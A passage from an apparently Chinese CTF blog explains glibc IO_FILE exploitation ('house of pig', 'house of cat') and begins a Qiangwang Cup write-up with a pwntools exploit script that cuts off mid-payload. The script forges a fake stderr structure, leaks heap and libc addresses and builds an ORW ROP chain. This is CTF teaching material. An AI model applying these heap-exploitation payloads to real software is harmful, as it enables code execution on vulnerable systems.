sh.close()</span><br></pre></td></tr></table></figure><p>详细题解可以看<a href="https://deepunk42.github.io/2023/07/27/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0/">另一篇博客</a></p><h2 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h2><ul><li><p>用于程序中只有<code>calloc</code>而没有<code>malloc</code>的情况</p></li><li><p>通常需要<strong>一次largebin attack</strong>以完成tcache stashing unlink attack的准备</p></li><li><p>需要<strong>一次tcache stashing unlink attack</strong></p></li></ul><p>调用虚表<code>_IO_str_jumps</code> -&gt; <code>_IO_str_overflow</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *new_buf;</span><br><span class="line">          <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">          <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">          <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">          <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">          new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 1</span></span><br><span class="line">          <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">              <span class="keyword">return</span> EOF;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">if</span> (old_buf)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen); <span class="comment">// 2</span></span><br><span class="line">              <span class="built_in">free</span> (old_buf); <span class="comment">// 3</span></span><br><span class="line">              <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">              fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen); <span class="comment">// 4</span></span><br><span class="line"> </span><br><span class="line">          _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">          fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">          fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">          fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">          fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><blockquote><p>打tcache stashing没有<code>malloc</code>取不出chunk怎么办？</p><p>我有<code>_IO_str_overflow</code>！！！（自豪）</p></blockquote><p>这个函数中，完美达成<code>malloc</code>、<code>memcpy</code>、<code>free</code>一条龙服务</p><p>什么？你的版本太高打不了<code>free_hook</code>？</p><p>没关系，最后还有一个<code>memset</code>可以写libc中的got表</p><p>如果需要打orw，<code>rdx</code>也是可控的</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811214840282.png" alt="image-20230811214840282"></p><p><code>&lt;+53&gt;mov rdx, QWORD PTR [rdi+0x28]</code></p><p><code>rdi</code>指向<code>_flags</code>，<code>rdi+0x28</code>指向<code>_IO_write_ptr</code>，可控</p><p>详细题解可以看<a href="https://deepunk42.github.io/2023/07/27/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0/">另一篇博客</a></p><h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>只需要<strong>一次</strong>任意写！</p><p>调用虚表<code>_IO_wfile_jumps</code>中的<code>_IO_wfile_seekoff</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line">#需要绕过was_writing的检测</span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">              || _IO_in_put_mode (fp));</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终目的是调用<code>_IO_switch_to_wget_mode</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">► 0x7fbbb9489d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line">  0x7fbbb9489d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line">  0x7fbbb9489d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx</span><br><span class="line">  0x7fbbb9489d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi</span><br><span class="line">  0x7fbbb9489d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">  0x7fbbb9489d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class="line">  0x7fbbb9489d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56                </span><br><span class="line">  0x7fbbb9489d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line">  0x7fbbb9489d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff</span><br><span class="line">  0x7fbbb9489d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure><p>这里call了一个<code>rax</code>相关的地址，而<code>rax</code>由<code>rdi</code>决定</p><p>再说调用条件，需要满足两个</p><ol><li><p><code>was_writing == 1</code></p><p>即fp-&gt;<code>_wide_data</code>-&gt;<code>_IO_write_ptr</code>    &gt;  fp-&gt;<code>_wide_data</code>-&gt;<code>_IO_write_base</code></p><p>这里用到了前面提到的<code>_wide_data</code>跳表，可以直接伪造so easy</p></li><li><p><code>mode!=0</code></p><p><code>rcx</code>&#x3D;&gt;<code>mode</code></p><p>如果无法满足，可以再做一个FILE结构体，进入第二个结构体时就置好了，详细内容参考<a href="https://phot0n.com/2022/09/06/%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%8EFSOP/">Photon的博客</a></p></li></ol><p>构造挺麻烦的，理解之后可以直接上别人的模板</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr=heapbase+<span class="number">0xb00</span> # 伪造的fake_IO结构体的地址</span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(rdi)         #_flags=rdi</span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="meta"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)#_IO_backup_base=rdx</span><br><span class="line">fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  # _lock = a writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)#_wide_data,rax1_addr</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="meta">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)  <span class="meta"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  # rax2_addr</span><br></pre></td></tr></table></figure><p>详细题解可以看<a href="https://deepunk42.github.io/2023/07/27/house-of-cat/">另一篇博客</a></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house of cat强网杯复现</title>
      <link href="/house-of-cat/"/>
      <url>/house-of-cat/</url>
      
        <content type="html"><![CDATA[<blockquote><p>最后一天的题，水水</p></blockquote><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="格式检查"><a href="#格式检查" class="headerlink" title="格式检查"></a>格式检查</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOGIN | r00t QWBQWXFadmin</span><br><span class="line">CAT | r00t QWBQWXF$\xff</span><br></pre></td></tr></table></figure><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>index在0到15间</p><p>0x418&lt;&#x3D; size &lt;&#x3D;0x46f</p><p>使用calloc</p><h4 id="delet"><a href="#delet" class="headerlink" title="delet"></a>delet</h4><p>UAF</p><h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p>write 0x30</p><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p>限制2次</p><p>每次只能修改<strong>0x30</strong></p><h2 id="攻击流程分析"><a href="#攻击流程分析" class="headerlink" title="攻击流程分析"></a>攻击流程分析</h2><p>由于不存在对exit的调用，且在main函数中无限循环，故无法进行FSOP</p><p>可以采用house of kiwi的触发IO思路，利用<code>__malloc_assert</code>调用<code>fflush(stderr)</code>或者<code>__fxprintf</code></p><p>所以需要攻击位于stderr上的指针，恰好本题该地址可写，这里使用一次largebin attack</p><p>另外，要触发<code>__malloc_assert</code>，需要修改topchunk的size</p><p>本题由于edit有长度限制，不方便使用之前构造堆重叠的方式，所以这里可以用第二次largebin attack攻击size</p><p>恰好共有两次edit机会，刚好用完e</p><p>另外，攻击top size时要注意，在将第二个chunk加入largebin时，不能改变top chunk的位置。也就是说，不能通过分配一个更大chunk的方式来得到第二个largechunk</p><p>这是因为对largebin进行unlink的操作在从topchunk分配chunk之前，此时修改过的size会被新的size覆盖掉。</p><p>所以这一步入largebin的操作，可以通过分配更小的chunk获得</p><p><img src="/../img/house-of-cat.assets/image-20230726120735530.png" alt="image-20230726120735530"></p><p>开了沙箱，禁用了execve，并检查read的fd是否为0</p><p>故只能打orw, 并且在open前需要先close(0)</p><h2 id="堆风水"><a href="#堆风水" class="headerlink" title="堆风水"></a>堆风水</h2><p>需要达到的效果是：两次largebin attack，分别使stderr指向可控内容的堆块、修改topchunk</p><p>看似比较简单，但需注意edit只能修改0x30，且只有两次机会</p><p>所以对伪造结构体内容的写入需要在add操作进行，入largebin之后对前6个地址会有覆盖，实测下来对IO利用没有影响</p><h2 id="IO利用流程分析"><a href="#IO利用流程分析" class="headerlink" title="IO利用流程分析"></a>IO利用流程分析</h2><p>_wide_data&#x3D;fake_io_addr+0x30</p><p>1.将[rdi+0xa0]<code>_wide_data</code>处的内容赋值给rax，为了避免与下面的rax混淆，称之为<strong>rax1</strong>。<br>2.将新赋值的[rax1+0x20]<code>_IO_backup_base</code>处的内容赋值给rdx。<br>3.将[rax1+0xe0]</p><p>处的内容赋值给rax，称之为<strong>rax2</strong>。<br>4.call调用[rax2+0x18]处的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_wide_data-&gt;_IO_read_ptr ！=_wide_data-&gt;_IO_read_end</span><br><span class="line">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</span><br><span class="line">#如果_wide_data=fake_io_addr+<span class="number">0x30</span>，其实也就是fp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base</span><br><span class="line">fp-&gt;_lock是一个可写地址（堆地址、libc中的可写地址</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(host, port)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">login = <span class="string">&quot;LOGIN | r00t QWB QWXFadmin&quot;</span></span><br><span class="line">cat = <span class="string">&quot;CAT | r00t QWB QWXF$\xff&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;content:\n&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">p.send(login)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x420</span>, cyclic(<span class="number">0x420</span>))<span class="comment">#largechunk 0</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x440</span>, cyclic(<span class="number">0x440</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x450</span>, cyclic(<span class="number">0x450</span>))</span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#leak largechunk</span></span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x21a0d0</span></span><br><span class="line">stderr_addr = libc_base + <span class="number">0x21a860</span></span><br><span class="line">setcontext61 = libc_base + <span class="number">0x53a6d</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;\x7f\x00\x00&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x290</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr_addr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0000000000029cd6</span>+libc_base</span><br><span class="line">pop_rdi = <span class="number">0x000000000002a3e5</span>+libc_base</span><br><span class="line">pop_rsi = <span class="number">0x000000000002be51</span>+libc_base</span><br><span class="line">pop_rax = <span class="number">0x0000000000045eb0</span> + libc_base</span><br><span class="line">syscall = <span class="number">0x0000000000091396</span> + libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment">#fake stderr----------------------------------------</span></span><br><span class="line">fake_stderr = heap_base + <span class="number">0xf70</span></span><br><span class="line">fake_rdx = fake_stderr + <span class="number">0x10</span> + <span class="number">0x200</span></span><br><span class="line">fake_stack = fake_stderr + <span class="number">0x10</span> + <span class="number">0x320</span></span><br><span class="line">io = p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">io += p64(<span class="number">1</span>) + p64(<span class="number">2</span>)<span class="comment">#rcx!=0</span></span><br><span class="line">io += p64(fake_rdx)<span class="comment">#backup_base rdx</span></span><br><span class="line">io += p64(setcontext61)</span><br><span class="line">io = io.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(libc_base+<span class="number">0x21ba60</span>)<span class="comment">#lock</span></span><br><span class="line">io = io.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(fake_stderr+<span class="number">0x30</span>)<span class="comment">#wide_data rax1</span></span><br><span class="line">io = io.ljust(<span class="number">0xb0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(<span class="number">1</span>)<span class="comment">#mode</span></span><br><span class="line">io = io.ljust(<span class="number">0xc8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]+<span class="number">0x10</span>)</span><br><span class="line">io += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">io += p64(fake_stderr+<span class="number">0x40</span>)</span><br><span class="line">io = io.ljust(<span class="number">0x200</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#fake rdx:</span></span><br><span class="line">payload = <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rdi-&gt;0</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span 